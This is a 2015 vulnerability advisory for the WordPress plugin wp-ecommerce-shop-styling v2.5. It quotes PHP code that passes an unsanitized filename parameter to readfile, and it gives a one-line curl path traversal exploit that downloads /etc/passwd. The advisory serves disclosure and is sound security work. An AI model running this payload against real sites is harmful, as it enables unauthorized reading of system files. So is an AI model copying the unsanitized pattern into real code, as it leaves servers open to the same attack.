@@ -1,0 +1,27 @@
+Title: Remote file download vulnerability in wordpress plugin wp-ecommerce-shop-styling v2.5
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-07-05
+Download Site: https://wordpress.org/plugins/wp-ecommerce-shop-styling
+Vendor: https://profiles.wordpress.org/haet/
+Vendor Notified: 2015-07-05, fixed in version 2.6.
+Vendor Contact: http://wpshopstyling.com
+Description: Customize your WP ecommerce store with HTML mail templates, message content, transaction results and PDF invoices with WYSIWYG editor and placeholders.
+Vulnerability:
+The code in ./wp-ecommerce-shop-styling/includes/download.php doesn't sanitize user input to prevent sensitive system files from being downloaded.
+
+
+1 <?php
+2 require_once("../../../../wp-admin/admin.php");
+3 
+4 header('Content-disposition: attachment; filename='.$_GET['filename']);
+5 header('Content-type: application/pdf');
+6 readfile(HAET_INVOICE_PATH.$_GET['filename']);
+7 ?>
+
+You'll have to rename the download file via mv -- -..-..-..-..-..-..-..-..-etc-passwd passwd as the filename is set to the download filename with path.
+
+CVEID: Requested TBD  
+OSVDB: TBD
+
+Exploit Code:
+  • $ curl http://server/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../../../../../../etc/passwd
